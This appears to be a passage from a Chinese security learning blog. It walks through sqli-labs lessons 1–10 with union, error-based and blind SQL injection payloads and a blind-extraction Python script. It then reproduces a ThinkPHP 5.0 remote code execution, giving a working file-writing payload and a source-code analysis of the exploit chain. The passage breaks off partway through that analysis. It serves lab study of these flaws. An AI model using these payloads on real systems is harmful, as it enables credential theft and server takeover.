不报错，证明闭合正确\n剩下和less1一样，还是手打一遍，有助于记忆\n-1’) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = database() –+\n-1’) union select 1,2,group_concat(column_name) from information_schema.columns where table_name = ‘users’ and table_schema = database() –+\n-1’) union select 1,group_concat(username),group_concat(password) from users –+\nless4:id=”($id)”\nand 1=1 and 1=2 正常返回\n‘ 闭合 正常返回\n“ 闭合 报错语句有 )\n“) –+  返回正常  闭合正确\n和less1一样，练练\n-1”) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema = database() –+\n-1”) union select 1,2,group_concat(column_name) from information_schema.columns where table_name = ‘users’ and table_schema = database() –+\n-1”) union select 1,group_concat(username),group_concat(password) from users –+\nless5：and 1=1 and 1=2  正常\n‘  报错\n‘ –+ 正常 ， 闭合成功\n页面只显示 you are in … ，说明是无回显，有报错使用报错注入\nupdatexml() \n函数介绍：https://blog.csdn.net/m0_60988110/article/details/123544853\nupdatexml(xml_doument,XPath_string,new_value)\n第一个参数：XML的内容\n第二个参数：是需要update的位置XPATH路径\n第三个参数：是更新后的内容\n所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合XPATH格式\nconcat() 连接字符串，字符串有一个为null，返回结果为null\n获取数据库名\n1’ and updatexml(1,concat(0x7e,(select database()),0x7e),1) –+\n其中0x7e只是十六进制的分隔符~  \nconcat_ws() 最前面使用0x7e，这样每个内容都会使用0x7e分割\nconcat_ws(0x7e,username,password)    返回 admin123456\n中间写入正常注入语句就行\n获取所有表名\n1’ and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x7e),1) –+\n如果输出内容有长度限制，可以使用**substr()**函数切割字符串\n1’ and updatexml(1,concat(0x7e,substr((select group_concat(table_name) from information_schema.tables where table_schema = database()),1,7),0x7e),1) –+\n返回emails,\n获取users表所有字段\n1’ and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name = ‘users’ and table_schema = database()),0x7e),1) –+\n获取users表中所有账号\n1’ and updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),1) –+\n获取users表中所有密码\n1’ and updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1) –+\nless6：and 1=1 and 1=2  ‘ 正常\n“ 报错，” –+ 正常  闭合成功\n和less5一样，报错注入\n表名\n1” and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema = database()),0x7e),1) –+\n字段名\n1” and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name = ‘users’ and table_schema = database()),0x7e),1) –+\n账号\n1” and updatexml(1,concat(0x7e,(select group_concat(username) from users),0x7e),1) –+\n密码\n1” and updatexml(1,concat(0x7e,(select group_concat(password) from users),0x7e),1) –+\nless7：正常流程 “ –+ 回显正常，闭合成功，诡哦! 看源码才知道使用 ‘))闭合才是对的\n这个过程应该是，先让他报错，之后再尝试注释，让其显示正常\n这个”  直接显示正常所以不对\n那为啥没有报错，是双引号特性吗?\n这里需要一个mysql终端测试。。。。\n无回显，无报错，显示使用outfile\n可以使用布尔盲注\n1’)) and length(database()) &gt;? –+ \n一个个测试，结果为8\n使用substring提取database()每一个字符，一个个比较获取结果\n1’)) and substring(database(),1,1) = ‘?’ –+\n在length() 里能执行正常语句，获取表名长度\n1’)) and length((select group_concat(table_name) from information_schema.tables where table_schema =database())) &gt; ? –+\n记得括号 () ，结果是29\n一样提取字符\n1’)) and substring((select group_concat(table_name) from information_schema.tables where table_schema =database()),1,1) = ‘?’ –+\n获取字段名长度\n1’)) and length((select group_concat(column_name) from information_schema.columns where table_name = ‘users’ and table_schema =database())) &gt; ? –+\n 结果是20，获取字符\n1’)) and substring((select group_concat(column_name) from information_schema.columns where table_name = ‘users’ and table_schema =database()),1,1) = ‘?’ –+\n获取账号长度\n1’)) and length((select group_concat(username) from users )) &gt; ? –+\n结果是91，提取账号字符\n1’)) and substring((select group_concat(username) from users )) = ‘?’ –+\n获取密码长度\n1’)) and length((select group_concat(password) from users )) &gt; ? –+\n结果是97，提取密码字符\n1’)) and substring((select group_concat(password) from users )) = ‘?’ –+\n这样弄好麻烦，在条件允许的情况下，阔以用脚本跑，但是脚本也很慢\n在挖src等，只需要证明危害既可\n脚本：# -*— codeing &#x3D; utf-8 -*-\n# @Time :2022-10-28 14:30\n# @Author : longw\n# @File : sqllab7-booleanblind.py\n# @Software : PyCharm\nimport requests\nimport re\n\nbaseurl &#x3D; &quot;http:&#x2F;&#x2F;192.168.0.108:86&#x2F;Less-7&#x2F;?id&#x3D;&quot;\npayload1 &#x3D; &quot;1&#39;)) and length(database()) &gt; &quot;\npayload2 &#x3D; &quot;1&#39;)) and substring(database(),&quot;\npayload3 &#x3D; &quot;1&#39;)) and length((select group_concat(table_name) from information_schema.tables where table_schema &#x3D;database())) &gt; &quot;\npayload4 &#x3D; &quot;1&#39;)) and substring((select group_concat(table_name) from information_schema.tables where table_schema &#x3D;database()),&quot;\npayload5 &#x3D; &quot;,1) &#x3D; &quot;\npayload6 &#x3D; &quot;1&#39;)) and length((select group_concat(column_name) from information_schema.columns where table_name &#x3D; &#39;users&#39; and table_schema &#x3D;database())) &gt; &quot;\npayload7 &#x3D; &quot;1&#39;)) and substring((select group_concat(column_name) from information_schema.columns where table_name &#x3D; &#39;users&#39; and table_schema &#x3D;database()),&quot;\nend &#x3D; &quot; --+&quot;\n\nheaders &#x3D; &#123;\n    &quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;85.0.4183.121 Safari&#x2F;537.36&quot; &#125;\n                    # http request报文头部，根据实际情况填写\nfeatures &#x3D; &#39;You are in.... Use outfile......&#39;\n\nzifu &#x3D; [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;, &#39;h&#39;, &#39;i&#39;, &#39;j&#39;, &#39;k&#39;, &#39;l&#39;,\n            &#39;m&#39;, &#39;n&#39;, &#39;o&#39;, &#39;p&#39;, &#39;q&#39;, &#39;r&#39;, &#39;s&#39;, &#39;t&#39;, &#39;u&#39;, &#39;v&#39;, &#39;w&#39;, &#39;x&#39;, &#39;y&#39;, &#39;z&#39;, &#39;,&#39;,\n            &#39;A&#39;, &#39;B&#39;, &#39;C&#39;, &#39;D&#39;, &#39;E&#39;, &#39;F&#39;, &#39;G&#39;, &#39;H&#39;, &#39;I&#39;, &#39;J&#39;, &#39;K&#39;, &#39;L&#39;,\n            &#39;M&#39;, &#39;N&#39;, &#39;O&#39;, &#39;P&#39;, &#39;Q&#39;, &#39;R&#39;, &#39;S&#39;, &#39;T&#39;, &#39;U&#39;, &#39;V&#39;, &#39;W&#39;, &#39;X&#39;, &#39;Y&#39;, &#39;Z&#39;]\n#用二分法判断长度快，但是懒得考虑\ndef ScanDatabase():\n    i&#x3D;1\n    while i &lt;&#x3D; 100:\n        url &#x3D; baseurl+payload1+str(i)+end\n        response &#x3D; requests.get(url, headers&#x3D;headers, timeout&#x3D;5)\n        # print(url)\n        if re.search(features, response.text) &#x3D;&#x3D; None:\n            print(&quot;数据库长度为：&quot; +str(i))\n            break\n        else:\n            if i &#x3D;&#x3D; 100:\n                print(&#39;范围不够&#39;)\n            i &#x3D; i + 1\n    #只考虑数据库名全为字母\n    #学习一波大佬生成的列表：https:&#x2F;&#x2F;github.com&#x2F;JacquelinXiang&#x2F;sqli_bool\n    #这个注入结果可能需要等到明年，你妹的\n    # keylist &#x3D; [chr(i) for i in range(33, 127)]  # 包括数字、大小写字母、可见特殊字符\n    database &#x3D; &#39;&#39;\n    k&#x3D;1\n    while k &lt;&#x3D; i:\n        for j in zifu:\n            url &#x3D; baseurl+payload2+ str(k) + payload5 +&quot;&#39;&quot; +j+&quot;&#39;&quot;+ end\n            response1 &#x3D; requests.get(url, headers&#x3D;headers,timeout&#x3D;5)\n            # print(url)\n            if re.search(features, response1.text) !&#x3D; None:\n                print(&quot;第&quot;+str(k)+&quot;个字符为：&quot;+ str(j))\n                database &#x3D; database + j\n                k &#x3D; k+1\n                break\n            else:\n                #先测试小写就行，反正结果就是小写\n                if j &#x3D;&#x3D; &#39;z&#39;:\n                    print(&quot;第&quot;+str(k)+&quot;个字符不是字母，请注意！！！&quot;)\n                    database &#x3D; database + &#39;x&#39;\n                    k &#x3D; k +1\n                    break\n    print(&quot;数据库名为：&quot;+database)\n\ndef ScanTables():\n    i &#x3D; 1\n    while i &lt;&#x3D; 100:\n        url &#x3D; baseurl + payload3 + str(i) + end\n        response &#x3D; requests.get(url, headers&#x3D;headers, timeout&#x3D;5)\n        # print(url)\n        if re.search(features, response.text) &#x3D;&#x3D; None:\n            print(&quot;表名长度为：&quot; + str(i))\n            break\n        else:\n            if i &#x3D;&#x3D; 100:\n                print(&#39;范围不够&#39;)\n            i &#x3D; i + 1\n    # 只考虑数据库名全为字母\n    database &#x3D; &#39;&#39;\n    k &#x3D; 1\n    while k &lt;&#x3D; i:\n        for j in zifu:\n            url &#x3D; baseurl + payload4 + str(k) + payload5 + &quot;&#39;&quot; + j + &quot;&#39;&quot; + end\n            response1 &#x3D; requests.get(url, headers&#x3D;headers, timeout&#x3D;5)\n            # print(url)\n            if re.search(features, response1.text) !&#x3D; None:\n                print(&quot;第&quot; + str(k) + &quot;个字符为：&quot; + str(j))\n                database &#x3D; database + j\n                k &#x3D; k + 1\n                break\n            else:\n                \n                if j &#x3D;&#x3D; &#39;Z&#39;:\n                    print(&quot;第&quot; + str(k) + &quot;个字符不是字母，请注意！！！&quot;)\n                    database &#x3D; database + &#39;?&#39;\n                    k &#x3D; k + 1\n                    break\n    print(&quot;所有表名为：&quot; + database)\n\ndef ScanColumns():\n    i &#x3D; 1\n    while i &lt;&#x3D; 100:\n        url &#x3D; baseurl + payload6 + str(i) + end\n        response &#x3D; requests.get(url, headers&#x3D;headers, timeout&#x3D;5)\n        # print(url)\n        if re.search(features, response.text) &#x3D;&#x3D; None:\n            print(&quot;users表所有字段长度为：&quot; + str(i))\n            break\n        else:\n            if i &#x3D;&#x3D; 100:\n                print(&#39;范围不够&#39;)\n            i &#x3D; i + 1\n    # 只考虑数据库名全为字母\n    database &#x3D; &#39;&#39;\n    k &#x3D; 1\n    while k &lt;&#x3D; i:\n        for j in zifu:\n            url &#x3D; baseurl + payload7 + str(k) + payload5 + &quot;&#39;&quot; + j + &quot;&#39;&quot; + end\n            response1 &#x3D; requests.get(url, headers&#x3D;headers, timeout&#x3D;5)\n            # print(url)\n            if re.search(features, response1.text) !&#x3D; None:\n                print(&quot;第&quot; + str(k) + &quot;个字符为：&quot; + str(j))\n                database &#x3D; database + j\n                k &#x3D; k + 1\n                break\n            else:\n                if j &#x3D;&#x3D; &#39;Z&#39;:\n                    print(&quot;第&quot; + str(k) + &quot;个字符不是字母，请注意！！！&quot;)\n                    database &#x3D; database + &#39;?&#39;\n                    k &#x3D; k + 1\n                    break\n    print(&quot;users库所有字段名为：&quot; + database)\n\n#其他都一样，后面两个太长不弄了\nScanDatabase()\n# ScanTables()\n# ScanColumns()\n\n#测试\n# response &#x3D; requests.get(baseurl, headers&#x3D;headers)\n# print(response.text)\n# body &#x3D; response.text\n# print(re.search(features, body))\n\nless8：and 1=1 and 1=2 正常\n‘ 报错 ‘ –+ 正常  闭合成功\n又是布尔盲注，和less7一样，改一下payload就行，不弄了\nless9：and 1=1  and 1=2  ‘  “ 都显示正常\n只能尝试时间盲注了\n1’ and if(1=1,sleep(3),0) –+   有很明显的三秒延时，说明是 ‘  闭合\n接下来就是和前面一样的注入尝试\n1’ and if(length(database())&gt;?,sleep(3),0) –+\n剩下的就是替换\nless10：and 1=1 and 1=2 ‘ “ 都正常\n测试时间盲注\n1 and if(1=1,sleep(3),0) –+\n1’ and if(1=1,sleep(3),0) –+\n1” and if(1=1,sleep(3),0) –+   有反应了，闭合成功\n剩下和前面一样\n小结：测试流程\n先数字，再字符，都是看页面报错\n有错误，来注释，依然报错尝试添加其他符号闭合,直到页面正常\n闭合成功看页面，有回显，union，无回显，布尔盲注\n无错误，测试时间盲注payload，再按照前面闭合流程走一遍\n找到闭合方式，以及注入方式，后面才讲bypass\n盲注框架：https://github.com/JacquelinXiang/sqli_blind\n","slug":"sql-labs-less1-10","date":"2022-10-28T11:34:39.000Z","categories_index":"靶场","tags_index":"sql注入","author_index":"Longw"},{"id":"02bb8134dce40015108a5a765c734167","title":"5.0-5.0.23RCE漏洞复现","content":"\n\n参考文章：https://mp.weixin.qq.com/s/DGWuSdB2DvJszom0C_dkoQ\nhttps://y4tacker.blog.csdn.net/article/details/115893304\nhttps://mp.weixin.qq.com/s/qI10_Wtc1wrcNvAP_MBURQ\n复现：环境：tp5.0.6  php5.4.45  \n先直接用Y4tacher的payload刚一波\nURL地址\nurl&#x2F;public&#x2F;?s&#x3D;captcha&amp;g&#x3D;implode\nPOST数据\npath&#x3D;PD9waHAgZmlsZV9wdXRfY29udGVudHMoJ3k0dGFja2VyLnBocCcsJzw&#x2F;cGhwIHBocGluZm8oKTs&#x2F;PicpOyA&#x2F;Pg&#x3D;&#x3D;&amp;_method&#x3D;__construct&amp;filter[]&#x3D;set_error_handler&amp;filter[]&#x3D;self::path&amp;filter[]&#x3D;base64_decode&amp;filter[]&#x3D;\\think\\view\\driver\\Php::Display&amp;method&#x3D;GET\n\n传过去页面报错，还以为失败了，看目录才发现已经将文件写入进去了\n\n\n接下来就是看文章读代码了\n漏洞利用点在thinkphp\\library\\think\\Request.php里的method方法\n&#x2F;**\n     * 当前的请求类型\n     * @access public\n     * @param bool $method  true 获取原始请求类型\n     * @return string\n     *&#x2F;\n    public function method($method &#x3D; false)\n    &#123;\n        if (true &#x3D;&#x3D;&#x3D; $method) &#123;\n            &#x2F;&#x2F; 获取原始请求类型\n            return IS_CLI ? &#39;GET&#39; : (isset($this-&gt;server[&#39;REQUEST_METHOD&#39;]) ? $this-&gt;server[&#39;REQUEST_METHOD&#39;] : $_SERVER[&#39;REQUEST_METHOD&#39;]);\n        &#125; elseif (!$this-&gt;method) &#123;\n            if (isset($_POST[Config::get(&#39;var_method&#39;)])) &#123;\n                $this-&gt;method &#x3D; strtoupper($_POST[Config::get(&#39;var_method&#39;)]);\n                $this-&gt;&#123;$this-&gt;method&#125;($_POST);\n            &#125; elseif (isset($_SERVER[&#39;HTTP_X_HTTP_METHOD_OVERRIDE&#39;])) &#123;\n                $this-&gt;method &#x3D; strtoupper($_SERVER[&#39;HTTP_X_HTTP_METHOD_OVERRIDE&#39;]);\n            &#125; else &#123;\n                $this-&gt;method &#x3D; IS_CLI ? &#39;GET&#39; : (isset($this-&gt;server[&#39;REQUEST_METHOD&#39;]) ? $this-&gt;server[&#39;REQUEST_METHOD&#39;] : $_SERVER[&#39;REQUEST_METHOD&#39;]);\n            &#125;\n        &#125;\n        return $this-&gt;method;\n    &#125;\n\n$method默认为false，会用get方法获取$_POST里的‘var_method’，在config.php里设置为_method参数的值，get函数就是获取内容，没什么营养。然后变成大写，接着就是动态调用类的方法，就是获取到底_method的值作为函数调用，$_POST的值作为参数。所以传入_method=xxx ，就会调用xxx函数，当这个xxx是__construct函数时\n&#x2F;**\n    * 架构函数\n    * @access protected\n    * @param array $options 参数\n    *&#x2F;\n   protected function __construct($options &#x3D; [])\n   &#123;\n       foreach ($options as $name &#x3D;&gt; $item) &#123;\n           if (property_exists($this, $name)) &#123;\n               $this-&gt;$name &#x3D; $item;\n           &#125;\n       &#125;\n       if (is_null($this-&gt;filter)) &#123;\n           $this-&gt;filter &#x3D; Config::get(&#39;default_filter&#39;);\n       &#125;\n       &#x2F;&#x2F; 保存 php:&#x2F;&#x2F;input\n       $this-&gt;input &#x3D; file_get_contents(&#39;php:&#x2F;&#x2F;input&#39;);\n   &#125;\n\n先检查这个类里是否有传入的参数相匹配的属性，有就赋值给属性，这就表示可以覆盖里面的所有属性值。之后，检查属性filter的值是否为空，为空则设置为全局默认过滤方法。之后通过input伪协议获取$_POST的内容存放到input属性里面。\n这里能覆盖属性，接着就是要找回调函数，和上个漏洞一样这里也是通过覆盖filter的值，在通过回调函数调用filter过滤时，执行代码。\n这个时候应该是在整个类里找使用filter的地方\n&#x2F;**\n    * 设置或获取当前的过滤规则\n    * @param mixed $filter 过滤规则\n    * @return mixed\n    *&#x2F;\n   public function filter($filter &#x3D; null)\n   &#123;\n       if (is_null($filter)) &#123;\n           return $this-&gt;filter;\n       &#125; else &#123;\n           $this-&gt;filter &#x3D; $filter;\n       &#125;\n   &#125;\n\nfilter过滤函数是取得类属性filter\n接着是input函数\n&#x2F;**\n     * 获取变量 支持过滤和默认值\n     * @param array         $data 数据源\n     * @param string|false  $name 字段名\n     * @param mixed         $default 默认值\n     * @param string|array  $filter 过滤函数\n     * @return mixed\n     *&#x2F;\n    public function input($data &#x3D; [], $name &#x3D; &#39;&#39;, $default &#x3D; null, $filter &#x3D; &#39;&#39;)\n    &#123;\n        if (false &#x3D;&#x3D;&#x3D; $name) &#123;\n            &#x2F;&#x2F; 获取原始数据\n            return $data;\n        &#125;\n        $name &#x3D; (string) $name;\n        if (&#39;&#39; !&#x3D; $name) &#123;\n            &#x2F;&#x2F; 解析name\n            if (strpos($name, &#39;&#x2F;&#39;)) &#123;\n                list($name, $type) &#x3D; explode(&#39;&#x2F;&#39;, $name);\n            &#125; else &#123;\n                $type &#x3D; &#39;s&#39;;\n            &#125;\n            &#x2F;&#x2F; 按.拆分成多维数组进行判断\n            foreach (explode(&#39;.&#39;, $name) as $val) &#123;\n                if (isset($data[$val])) &#123;\n                    $data &#x3D; $data[$val];\n                &#125; else &#123;\n                    &#x2F;&#x2F; 无输入数据，返回默认值\n                    return $default;\n                &#125;\n            &#125;\n            if (is_object($data)) &#123;\n                return $data;\n            &#125;\n        &#125;\n\n        &#x2F;&#x2F; 解析过滤器\n        if (is_null($filter)) &#123;\n            $filter &#x3D; [];\n        &#125; else &#123;\n            $filter &#x3D; $filter ?: $this-&gt;filter;\n            if (is_string($filter)) &#123;\n                $filter &#x3D; explode(&#39;,&#39;, $filter);\n            &#125; else &#123;\n                $filter &#x3D; (array) $filter;\n            &#125;\n        &#125;\n\n        $filter[] &#x3D; $default;\n        if (is_array($data)) &#123;\n            array_walk_recursive($data, [$this, &#39;filterValue&#39;], $filter);\n            reset($data);\n        &#125; else &#123;\n            $this-&gt;filterValue($data, $name, $filter);\n        &#125;\n\n        if (isset($type) &amp;&amp; $data !&#x3D;&#x3D; $default) &#123;\n            &#x2F;&#x2F; 强制类型转换\n            $this-&gt;typeCast($data, $type);\n        &#125;\n        return $data;\n    &#125;\n\n如果传入的$name恒等于false，就直接返回$data。不是false则将$name的类型转化为string。判断$name是否为空字符串，不是则解析$name，通过/来分开$name。\n之后又通过. 来拆开$name，判断$data里面是否有拆开的$name的值。接着判断$data是不是对象，是就返回$data。\n判断$filter是否为空，不为空就通过\n$filter = $filter ?: $this-&gt;filter;\n这句有点懵逼，反正就是获取类的filter属性。是string就分开，不是string就变为数组\n这怎么后面又  $filter[] = $default; \n还是写个小代码看看，是怎么回事\n&lt;?php\nfunction test($filter,$default&#x3D;null)&#123;\n    if (is_null($filter)) &#123;\n        $filter &#x3D; [];\n    &#125; else &#123;\n        if (is_string($filter)) &#123;\n            $filter &#x3D; explode(&#39;,&#39;, $filter);\n        &#125; else &#123;\n            $filter &#x3D; (array) $filter;\n        &#125;\n    &#125;\n\n    $filter[] &#x3D; $default;\n    var_dump($filter);\n&#125;\ntest(&#39;assert&#39;);\n?&gt;\narray(2) &#123; [0]&#x3D;&gt; string(6) &quot;assert&quot; [1]&#x3D;&gt; NULL &#125;\n\n你妹的，原来就是添加到数组的意思\n后面判断$data是否为数组，是的话就通过array_walk_recursive进行过滤，终于到这一步了，通过filterValue进行过滤，$filter作为filterValue的参数。不是数组也通过filterValue过滤。之后就是强转data的类型，返回数据了。\n&#x2F;**\n     * 递归过滤给定的值\n     * @param mixed     $value 键值\n     * @param mixed     $key 键名\n     * @param array     $filters 过滤方法+默认值\n     * @return mixed\n     *&#x2F;\n    private function filterValue(&amp;$value, $key, $filters)\n    &#123;\n        $default &#x3D; array_pop($filters);\n        foreach ($filters as $filter) &#123;\n            if (is_callable($filter)) &#123;\n                &#x2F;&#x2F; 调用函数或者方法过滤\n                $value &#x3D; call_user_func($filter, $value);\n            &#125; elseif (is_scalar($value)) &#123;\n                if (strpos($filter, &#39;&#x2F;&#39;)) &#123;\n                    &#x2F;&#x2F; 正则过滤\n                    if (!preg_match($filter, $value)) &#123;\n                        &#x2F;&#x2F; 匹配不成功返回默认值\n                        $value &#x3D; $default;\n                        break;\n                    &#125;\n                &#125; elseif (!empty($filter)) &#123;\n                    &#x2F;&#x2F; filter函数不存在时, 则使用filter_var进行过滤\n                    &#x2F;&#x2F; filter为非整形值时, 调用filter_id取得过滤id\n                    $value &#x3D; filter_var($value, is_int($filter) ? $filter : filter_id($filter));\n                    if (false &#x3D;&#x3D;&#x3D; $value) &#123;\n                        $value &#x3D; $default;\n                        break;\n                    &#125;\n                &#125;\n            &#125;\n        &#125;\n        return $this-&gt;filterExp($value);\n    &#125;\n\nfilterValue通过call_user_func进行过滤。参数都可以同method方法来控制。\n现在找用到input函数的地方，哪里用到了\n第一个地方就是param函数了\n&#x2F;**\n     * 获取获取当前请求的参数\n     * @access public\n     * @param string|array  $name 变量名\n     * @param mixed         $default 默认值\n     * @param string|array  $filter 过滤方法\n     * @return mixed\n     *&#x2F;\n    public function param($name &#x3D; &#39;&#39;, $default &#x3D; null, $filter &#x3D; &#39;&#39;)\n    &#123;\n        if (empty($this-&gt;param)) &#123;\n            $method &#x3D; $this-&gt;method(true);\n            &#x2F;&#x2F; 自动获取请求变量\n            switch ($method) &#123;\n                case &#39;POST&#39;:\n                    $vars &#x3D; $this-&gt;post(false);\n                    break;\n                case &#39;PUT&#39;:\n                case &#39;DELETE&#39;:\n                case &#39;PATCH&#39;:\n                    $vars &#x3D; $this-&gt;put(false);\n                    break;\n                default:\n                    $vars &#x3D; [];\n            &#125;\n            &#x2F;&#x2F; 当前请求参数和URL地址中的参数合并\n            $this-&gt;param &#x3D; array_merge($this-&gt;get(false), $vars, $this-&gt;route(false));\n        &#125;\n        if (true &#x3D;&#x3D;&#x3D; $name) &#123;\n            &#x2F;&#x2F; 获取包含文件上传信息的数组\n            $file &#x3D; $this-&gt;file();\n            $data &#x3D; array_merge($this-&gt;param, $file);\n            return $this-&gt;input($data, &#39;&#39;, $default, $filter);\n        &#125;\n        return $this-&gt;input($this-&gt;param, $name, $default, $filter);\n    &#125;\n\n\n判断param属性是否为空，接着调用mthod方法。然后就是获取请求内容，接着调用input方法了。\n开始以为调用的是最下面的input，后面看文章发现，在第一个if判断时，会调用\n // 当前请求参数和URL地址中的参数合并\n​            $this-&gt;param = array_merge($this-&gt;get(false), $vars, $this-&gt;route(false));\nget函数:\n&#x2F;**\n     * 设置获取获取GET参数\n     * @access public\n     * @param string|array  $name 变量名\n     * @param mixed         $default 默认值\n     * @param string|array  $filter 过滤方法\n     * @return mixed\n     *&#x2F;\n    public function get($name &#x3D; &#39;&#39;, $default &#x3D; null, $filter &#x3D; &#39;&#39;)\n    &#123;\n        if (empty($this-&gt;get)) &#123;\n            $this-&gt;get &#x3D; $_GET;\n        &#125;\n        if (is_array($name)) &#123;\n            $this-&gt;param      &#x3D; [];\n            return $this-&gt;get &#x3D; array_merge($this-&gt;get, $name);\n        &#125;\n        return $this-&gt;input($this-&gt;get, $name, $default, $filter);\n    &#125;\n\n而在get函数里面，也会用到input函数。但是在这个get传入了false，在执行到input的时候，会直接返回数据。不会进行下面语句。\npublicfunctioninput($data &#x3D; [], $name &#x3D; &#39;&#39;, $default &#x3D; null, $filter &#x3D; &#39;&#39;)\n  &#123;\n      if (false &#x3D;&#x3D;&#x3D; $name) &#123;\n          &#x2F;&#x2F; 获取原始数据\n          return$data;\n      &#125;\n\n而在后面一个input，传入的name为默认的空字符串，会执行到下面过滤，就会触发命令执行。而且这个$name不是类的属性，只是局部变量，不能通过传入$name进行覆盖。\n所以，第一个参考链接里，启明星辰那篇文章应该写错了，为了防止判断错误，直接脚本验证\n当然没有动态调式过，可能分析有错\n&lt;?php\nfunction get($name&#x3D;&#39;&#39;,$default &#x3D; null, $filter &#x3D; &#39;&#39;)&#123;\n    $default&#x3D; &#39;&#39;;\n    $filter&#x3D;&#39;&#39;;\n    return test1($name,1);\n&#125;\nfunction test1($name&#x3D;&#39;&#39;,$data)&#123;\n    if(false&#x3D;&#x3D;&#x3D;$name)&#123;\n        return $data;\n    &#125;\n    return $data+1;\n&#125;\necho get(false).&#39;&lt;&#x2F;br&gt;&#39;;\necho get();\n?&gt;\n\n\n上面就是通过method来代码执行的链\n所以需要先用method函数修改属性值，接着利用param函数来执行代码，到这里就懵逼了，直接看文章怎么用的\n第一个payload：简单\n\n直接post提交参数就行了，关键是原理是啥呢？\n看入口文件怎么写的，包含start.php，在使用App的run函数\n&#x2F;**\n     * 执行应用程序\n     * @access public\n     * @param Request $request Request对象\n     * @return Response\n     * @throws Exception\n     *&#x2F;\n    public static function run(Request $request &#x3D; null)\n    &#123;\n        is_null($request) &amp;&amp; $request &#x3D; Request::instance();\n\n        try &#123;\n            $config &#x3D; self::initCommon();\n            if (defined(&#39;BIND_MODULE&#39;)) &#123;\n                &#x2F;&#x2F; 模块&#x2F;控制器绑定\n                BIND_MODULE &amp;&amp; Route::bind(BIND_MODULE);\n            &#125; elseif ($config[&#39;auto_bind_module&#39;]) &#123;\n                &#x2F;&#x2F; 入口自动绑定\n                $name &#x3D; pathinfo($request-&gt;baseFile(), PATHINFO_FILENAME);\n                if ($name &amp;&amp; &#39;index&#39; !&#x3D; $name &amp;&amp; is_dir(APP_PATH . $name)) &#123;\n                    Route::bind($name);\n                &#125;\n            &#125;\n\n            $request-&gt;filter($config[&#39;default_filter&#39;]);\n\n            if ($config[&#39;lang_switch_on&#39;]) &#123;\n                &#x2F;&#x2F; 开启多语言机制 检测当前语言\n                Lang::detect();\n            &#125; else &#123;\n                &#x2F;&#x2F; 读取默认语言\n                Lang::range($config[&#39;default_lang&#39;]);\n            &#125;\n            $request-&gt;langset(Lang::range());\n            &#x2F;&#x2F; 加载系统语言包\n            Lang::load([\n                THINK_PATH . &#39;lang&#39; . DS . $request-&gt;langset() . EXT,\n                APP_PATH . &#39;lang&#39; . DS . $request-&gt;langset() . EXT,\n            ]);\n\n            &#x2F;&#x2F; 获取应用调度信息\n            $dispatch &#x3D; self::$dispatch;\n            if (empty($dispatch)) &#123;\n                &#x2F;&#x2F; 进行URL路由检测\n                $dispatch &#x3D; self::routeCheck($request, $config);\n            &#125;\n            &#x2F;&#x2F; 记录当前调度信息\n            $request-&gt;dispatch($dispatch);\n\n            &#x2F;&#x2F; 记录路由和请求信息\n            if (self::$debug) &#123;\n                Log::record(&#39;[ ROUTE ] &#39; . var_export($dispatch, true), &#39;info&#39;);\n                Log::record(&#39;[ HEADER ] &#39; . var_export($request-&gt;header(), true), &#39;info&#39;);\n                Log::record(&#39;[ PARAM ] &#39; . var_export($request-&gt;param(), true), &#39;info&#39;);\n            &#125;\n\n            &#x2F;&#x2F; 监听app_begin\n            Hook::listen(&#39;app_begin&#39;, $dispatch);\n            &#x2F;&#x2F; 请求缓存检查\n            $request-&gt;cache($config[&#39;request_cache&#39;], $config[&#39;request_cache_expire&#39;], $config[&#39;request_cache_except&#39;]);\n\n            switch ($dispatch[&#39;type&#39;]) &#123;\n                case &#39;redirect&#39;:\n                    &#x2F;&#x2F; 执行重定向跳转\n                    $data &#x3D; Response::create($dispatch[&#39;url&#39;], &#39;redirect&#39;)-&gt;code($dispatch[&#39;status&#39;]);\n                    break;\n                case &#39;module&#39;:\n                    &#x2F;&#x2F; 模块&#x2F;控制器&#x2F;操作\n                    $data &#x3D; self::module($dispatch[&#39;module&#39;], $config, isset($dispatch[&#39;convert&#39;]) ? $dispatch[&#39;convert&#39;] : null);\n                    break;\n                case &#39;controller&#39;:\n                    &#x2F;&#x2F; 执行控制器操作\n                    $vars &#x3D; array_merge(Request::instance()-&gt;param(), $dispatch[&#39;var&#39;]);\n                    $data &#x3D; Loader::action($dispatch[&#39;controller&#39;], $vars, $config[&#39;url_controller_layer&#39;], $config[&#39;controller_suffix&#39;]);\n                    break;\n                case &#39;method&#39;:\n                    &#x2F;&#x2F; 执行回调方法\n                    $vars &#x3D; array_merge(Request::instance()-&gt;param(), $dispatch[&#39;var&#39;]);\n                    $data &#x3D; self::invokeMethod($dispatch[&#39;method&#39;], $vars);\n                    break;\n                case &#39;function&#39;:\n                    &#x2F;&#x2F; 执行闭包\n                    $data &#x3D; self::invokeFunction($dispatch[&#39;function&#39;]);\n                    break;\n                case &#39;response&#39;:\n                    $data &#x3D; $dispatch[&#39;response&#39;];\n                    break;\n                default:\n                    throw new \\InvalidArgumentException(&#39;dispatch type not support&#39;);\n            &#125;\n        &#125; catch (HttpResponseException $exception) &#123;\n            $data &#x3D; $exception-&gt;getResponse();\n        &#125;\n\n        &#x2F;&#x2F; 清空类的实例化\n        Loader::clearInstance();\n\n        &#x2F;&#x2F; 输出数据到客户端\n        if ($data instanceof Response) &#123;\n            $response &#x3D; $data;\n        &#125; elseif (!is_null($data)) &#123;\n            &#x2F;&#x2F; 默认自动识别响应输出类型\n            $isAjax   &#x3D; $request-&gt;isAjax();\n            $type     &#x3D; $isAjax ? Config::get(&#39;default_ajax_return&#39;) : Config::get(&#39;default_return_type&#39;);\n            $response &#x3D; Response::create($data, $type);\n        &#125; else &#123;\n            $response &#x3D; Response::create();\n        &#125;\n\n        